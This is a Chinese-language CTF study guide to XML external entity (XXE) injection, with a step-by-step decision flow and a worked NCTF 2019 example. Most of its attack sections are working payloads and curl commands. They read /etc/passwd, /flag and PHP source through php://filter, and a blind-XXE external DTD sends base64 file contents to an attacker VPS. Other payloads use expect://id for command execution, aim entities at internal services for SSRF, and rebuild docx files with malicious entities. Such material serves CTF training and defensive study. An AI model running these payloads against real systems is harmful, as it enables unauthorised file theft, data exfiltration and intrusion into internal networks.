# XXE 外部实体注入

关键词：XXE XML外部实体注入 外部实体 盲XXE OOB 实体注入 XML解析 带外

## ① 识别指纹

- 请求体是 XML：以 `<?xml version="1.0"?>` 开头，或 `Content-Type: application/xml` / `text/xml`
- 有 XML 相关接口：SOAP、RSS/Atom、sitemap、SVG 上传、Office 文档（docx/xlsx/pptx）解析
- 源码里出现 `DocumentBuilderFactory`、`SAXParser`、`XMLReader`、`simplexml_load_string`、`lxml.etree`、`XmlDocument`
- 报错栈出现 `SAXParseException`、`DOCTYPE`、`Entity`、`org.xml.sax`
- 页面源码里 JS 拼 XML 字符串再 POST（例如 `contentType: "application/xml"`）
- 上传点收 `.svg`、`.docx`、`.xlsx`，并且服务端会解析内容而不是只存盘
- 题干出现 **XML / 解析 / 导入 / 预览 / 日志 / SOAP** 这类词
- 题目名带 **XXE / XML / Simple / Cookbook / Notes / Import**
- 接口是 JSON，但后端用了 XML 解析器或做了 JSON→XML 转换

## ② 考什么

- 两个前提：能控制 XML 内容，且解析器允许外部实体（或参数实体）
- 内部实体与外部实体的声明、引用方式
- `file://` 读任意文件；Windows 与 Linux 的路径差异
- `php://filter/convert.base64-encode/resource=...` 读 PHP 源码
- 盲 XXE：参数实体 + 外部 DTD + 带外（OOB）回传
- error-based XXE：把文件内容拼进非法路径，从解析报错里读
- `expect://id` 命令执行（PHP expect 扩展）
- `jar://`、`netdoc://`（Java 解析器）读 jar 内条目或触发外部请求
- 把实体指向内网地址，做 SSRF / 端口探测
- 拒绝服务：billion laughs、quadratic blowup（实体递归膨胀，只需知道存在）
- 解析器差异：libxml2（PHP）、Java DocumentBuilder、.NET XmlReader、Python lxml / ElementTree
- docx / xlsx / svg 本质是 XML 容器，改完重新打包即可
- JSON 接口改成 XML 的尝试（`Content-Type` 与 body 同时换）

## ③ 判断流程

> 先确认「解析器在展开实体」，再谈读文件；两个前提缺一个，后面所有 payload 都不成立。

1. **找 XML 入口**：抓正常请求，`Content-Type` 是 `application/xml` / `text/xml` / `application/soap+xml`，或 body 以 `<?xml` 开头 → 进 2；body 是 JSON → 跳 11；只有上传点（docx/xlsx/svg）→ 跳 13
2. **试内部实体**：发 `<!DOCTYPE r [<!ENTITY x "abc">]><r>&x;</r>`，响应里出现 `abc` → 实体展开，进 3；响应里是 `&x;` 原文 → 实体被禁，跳 10
3. **读系统文件**：把实体值换成 `SYSTEM "file:///etc/passwd"`，响应出现 `root:x:0:0` → 有回显 XXE，进 8；实体位置为空或报错 → 进 4
4. **换目标文件**：依次试 `file:///flag`、`file:///flag.txt`、`file:///proc/self/environ`、`file:///etc/hostname`、`file:///c:/windows/win.ini`；命中 → 进 8；全部为空 → 进 5
5. **测外带能力**：主请求里放参数实体 `<!ENTITY % dtd SYSTEM "http://VPS:8000/e.dtd">%dtd;`，VPS 上起 `python3 -m http.server 8000` 看日志 → 收到 `GET /e.dtd`，进 6；没收到 → 跳 9
6. **外部 DTD 外带**：VPS 上放 evil.dtd（见 ④），把目标文件 base64 后塞进 URL；HTTP 日志出现 `GET /?d=...` → 解码，结束；日志里 `d=` 为空 → 跳 7
7. **报错外带**：把文件内容拼进一个不存在的 `file://` 路径，从解析错误信息里读（见 ④）；报错里出现文件内容 → 结束；报错被统一吞掉 → 跳 9
8. **有回显时读源码**：PHP 源码用 `php://filter/convert.base64-encode/resource=index.php`，直接 `file://` 会因 `<?php` 破坏 XML 结构；响应里的 base64 解码出源码，找 flag 或下一跳，结束
9. **无出网、无报错**：试 `expect://id`（PHP expect 扩展）、`jar:http://VPS/a.jar!/`（Java 触发外部请求）、`netdoc:///etc/passwd`（旧 Java）、`gopher://` 打内网；任一成功 → 结束
10. **实体被禁**：换参数实体 `%xxe;`、把 `SYSTEM` 改成 `PUBLIC`、或从 JSON 接口改 XML 重试；仍无法展开 → 跳 14
11. **JSON 接口改造**：把 `Content-Type` 改成 `application/xml`，body 换成同名 XML 再发 → 返回解析错误或正常解析，进 2；返回 415/400 且无 XML 解析痕迹 → 跳 14
12. **SOAP / RSS / sitemap 入口**：这些接口天然收 XML，直接套第 3 条 payload；命中 → 进 8；未命中 → 跳 13
13. **上传容器文件**：docx/xlsx 解压后改 `word/document.xml`、`xl/sharedStrings.xml`，SVG 直接加 DOCTYPE，重新打包上传 → 服务端解析时触发，回 2
14. **兜底**：以上都不成立 → 回 1，把所有字符串参数都按 XML 片段试（`?data=<xml>`），并确认是否存在「网关解析一次、应用再解析一次」的双层解析

## ④ 工具与命令

```bash
# 最基础的有回显 payload，存成文件（--data-binary 保留换行，别用 -d）
cat > xxe.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
EOF

curl -s -X POST 'http://t.cn/api' \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml
```

```bash
# 读 PHP 源码：必须 base64，否则 <?php 会让 XML 解析失败
cat > xxe-src.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>&xxe;</name></root>
EOF

curl -s -X POST 'http://t.cn/api' -H 'Content-Type: application/xml' \
  --data-binary @xxe-src.xml | grep -oE '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d
```

```bash
# 盲 XXE：VPS 上放 evil.dtd，并起一个会记录请求的 HTTP 服务
cat > evil.dtd <<'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://VPS:8000/?d=%file;'>">
%eval;
%exfil;
EOF

python3 -m http.server 8000
# 另一侧发主请求，触发加载外部 DTD
```

```xml
<!-- 触发外部 DTD 的主请求 -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://VPS:8000/evil.dtd">
  %dtd;
]>
<root><name>x</name></root>
```

```xml
<!-- error-based：文件内容拼进不存在的路径，从报错里读 -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><name>x</name></root>
```

```text
# 常用协议与路径
file:///etc/passwd                 Linux
file:///c:/windows/win.ini         Windows
php://filter/convert.base64-encode/resource=index.php
expect://id                        PHP expect 扩展，直接执行
jar:file:///tmp/a.jar!/a.txt       Java，读 jar 内条目
jar:http://VPS/a.jar!/             Java，触发外部 HTTP 请求
netdoc:///etc/passwd               旧版 Java
http://127.0.0.1:6379/             实体指向内网，做 SSRF
```

```bash
# 上传类：docx/xlsx 是 zip，改完 XML 再打回去
unzip -o upload.docx -d docx_unzip
# 编辑 docx_unzip/word/document.xml，在根元素前插入 DOCTYPE 与 &xxe; 引用
cd docx_unzip && zip -r ../evil.docx . && cd ..
curl -s -F 'file=@evil.docx' 'http://t.cn/upload'
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 响应里 `&xxe;` 原样出现 | 解析器 strip 了 DOCTYPE，或外部实体默认关闭 | 换参数实体、`PUBLIC`，或换一个 XML 入口 |
| 读 `/etc/passwd` 为空 | 目标不是 Linux，或该文件无读权限 | 换 `c:/windows/win.ini`、`/flag`、`/proc/self/environ` |
| `file://` 读 PHP 源码直接报解析错 | 源码里的 `<?php` 被当成 XML 处理指令 | 改用 `php://filter/convert.base64-encode` |
| 盲 XXE 的 VPS 一直没请求 | 参数实体只在外部 DTD 里生效，且目标不出网 | 用外部 DTD；先确认 DNS/HTTP 能出去 |
| 外带内容少字符或乱码 | base64 的 `+` `/` `=` 在 URL 里被改写，或内容含换行 | 接收端先 URL 解码；多行文件务必 base64 |
| DTD 里写 `%file;` 报错 | 内部子集不允许参数实体引用 | 把整段搬到外部 DTD |
| 本地 Python 复现没反应 | `xml.etree.ElementTree` 默认不解析外部实体 | 用 `lxml` 并显式开启，或确认题目不是 XXE |
| 上传 docx 后毫无变化 | 服务端只做文本抽取，或禁用了 DTD | 换 SVG、SOAP 入口，或看解析报错 |
| `expect://` 报协议不支持 | PHP 未装 expect 扩展 | 改走 `jar://`、SSRF 或文件读取 |
| JSON 接口改 XML 返 415 | 后端只接受 JSON | 找 body 里的 `xml` 字符串字段，或换接口 |
| 打 billion laughs 把靶机打挂 | 实体递归膨胀占用内存 | 比赛里只验证一次，别在共享环境反复打 |

## ⑥ 例题

**题目**：`[NCTF 2019] Fake XML cookbook`
**来源**：BUUCTF / NSSCTF 复现平台（原题出自 NCTF 2019）
**题干**：一个登录页面，用户名、密码两个输入框，没有其他提示。

**关键观察**：查看页面源码，登录的 JS 里写着 `contentType: "application/xml;charset=utf-8"`，请求发往 `doLogin.php`；提交后用户名会在响应的 `<msg>` 里回显。这说明 body 是 XML，且解析结果会回显 —— XXE 的两个前提都满足。

**走了哪条链**：第 1 条（找到 XML 入口）→ 第 2 条（内部实体 `abc` 正常展开）→ 第 3 条（`file:///flag` 有回显）→ 第 8 条（确定有回显后的读法，直接读 flag）。

**命令与输出**：

```http
POST /doLogin.php HTTP/1.1
Host: TARGET
Content-Type: application/xml;charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
]>
<user><username>&admin;</username><password>123</password></user>
```

用 Burp 发时它会自动补 `Content-Length`；手写 socket 时按 body 实际字节数填。正常登录时响应是 `<msg>Hello admin</msg>` 这类回显；把 `username` 换成实体引用后，`<msg>` 里直接变成 `/flag` 的内容：

```text
<msg>flag{...}</msg>
```

如果 `/flag` 不存在，用同一结构换成 `php://filter/convert.base64-encode/resource=doLogin.php`，把响应里的 base64 解出来看源码，再决定读哪个路径。

**结果**：flag 内容随 `<msg>` 回显。flag 以原题平台为准。

::: tip flag 说明
本页例题的 flag 随平台和原题版本变化，不在页内固定。练习目标是**先验证实体展开、再选读法**，不是背 payload。
:::
